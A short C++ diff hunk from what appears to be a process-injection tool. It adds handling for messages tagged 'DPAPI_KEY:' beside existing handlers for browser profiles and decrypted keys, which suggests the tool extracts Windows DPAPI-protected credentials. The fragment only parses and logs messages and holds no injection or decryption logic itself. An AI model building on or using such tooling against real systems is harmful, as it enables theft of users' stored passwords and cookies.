@@ -95,6 +95,9 @@ namespace Injector {
                     console.ProfileHeader(msg.substr(8));
                     m_stats.profiles++;
                 }
+                else if (msg.rfind("DPAPI_KEY:", 0) == 0) {
+                    console.DpapiKeyDecrypted(msg.substr(10));
+                }
                 else if (msg.rfind("KEY:", 0) == 0) {
                     console.KeyDecrypted(msg.substr(4));
                 }
